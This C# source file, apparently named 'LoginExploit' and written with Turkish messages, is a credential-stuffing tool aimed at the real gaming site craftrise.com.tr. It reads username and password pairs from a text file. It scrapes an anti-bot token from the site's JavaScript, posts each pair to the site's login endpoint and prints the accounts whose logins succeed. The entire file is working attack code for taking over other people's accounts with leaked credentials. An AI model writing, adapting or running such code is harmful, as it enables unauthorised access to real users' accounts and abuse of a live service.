using System;
using Newtonsoft.Json.Linq;
using System.Net;
using System.Text;

namespace LoginExploit
{
    class Program
    {
        public static bool error = false;
        public static void Main(string[] args)
        {
            Program program = new Program();
            if(error == false)
            {
                Console.Clear();
                Console.WriteLine("\nToplamda {0} adet hesaba giriş yapıldı.", program.worked.Count);
                foreach (Accounts account in program.worked)
                {
                    Console.WriteLine("Kullanıcı adı: {0} Şifre: {1}", account.Username, account.Password);
                }
            }
            Console.ReadLine();
        }

        private List<Accounts> worked = new List<Accounts>();
        private CookieContainer cookies = new CookieContainer();

        public Program()
        {
            string[] inputFile;
            try
            {
                inputFile = File.ReadAllLines("accounts.txt");
            }
            catch
            {
                Console.WriteLine("accounts.txt bulunamadı.");
                error = true;
                return;
            }
            Console.WriteLine("Ayraç karakterini giriniz:");
            string brace = Console.ReadLine();
            Console.Clear();

            int line = 1;
            enterSite();
            foreach (string account in inputFile)
            {
                try
                {
                    string[] data = account.Split(brace.ToCharArray());
                    login(data[0], data[1]);
                    line++;
                } catch
                {
                    Console.WriteLine("Ayraç kullanımı hatalı ({0}) -> Line:{1}", inputFile[line-1], line);
                    error = true;
                    return;
                }
            }
        }

        public void enterSite()
        {
            var request = (HttpWebRequest)WebRequest.Create("https://www.craftrise.com.tr/");

            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0";
            request.Host = "www.craftrise.com.tr";
            request.CookieContainer = this.cookies;
            request.Headers.Add("accept-language", "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7,la;q=0.6");

            var response = new StreamReader(request.GetResponse().GetResponseStream()).ReadToEnd();
        }

        public string getToken()
        {
            var request = (HttpWebRequest)WebRequest.Create("https://www.craftrise.com.tr/js/rise_new.js");

            request.Method = "GET";
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0";
            request.Host = "www.craftrise.com.tr";
            request.CookieContainer = this.cookies;
            request.Headers.Add("accept-language", "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7,la;q=0.6");

            string response = new StreamReader(request.GetResponse().GetResponseStream()).ReadToEnd();
            string[] arrayResponse = response.Split(';');
            var keyVariable = arrayResponse[46];
            return keyVariable.Replace("var RISE_KEY = ", "").Replace('"'.ToString(), "").Replace("\n", "");
        }

        public void login(String username, String password)
        {
            string post = "value=" + username + "&password=" + password + "&token=" + getToken();
            byte[] postBytes = Encoding.UTF8.GetBytes(post);

            var request = (HttpWebRequest)WebRequest.Create("https://www.craftrise.com.tr/posts/post-login.php");

            request.Method = "POST";
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0";
            request.Host = "www.craftrise.com.tr";
            request.CookieContainer = this.cookies;
            request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
            request.ContentLength = postBytes.Length;
            request.Referer = "https://www.craftrise.com.tr/";

            request.GetRequestStream().Write(postBytes, 0, postBytes.Length);
            string response = new StreamReader(request.GetResponse().GetResponseStream()).ReadToEnd();

            try
            {
                var jsonData = JObject.Parse(response);
                if (jsonData["resultType"].ToString().Equals("success"))
                {
                    Console.WriteLine("({0}): Giriş başarılı.", username);
                    worked.Add(new Accounts(username, password));
                }
                else Console.WriteLine("(" + username + "): " + jsonData["resultMessage"].ToString());
            }
            catch
            {
                Console.WriteLine("Bir hata oluştu. (#1)");
                error = true;
                return;
            }
        }

        public class Accounts
        {
            private String username;
            private String password;

            public Accounts(String username, String password)
            {
                this.username = username;
                this.password = password;
            }

            public String Username { get { return username; } }
            public String Password { get { return password; } }
        }
    }
}
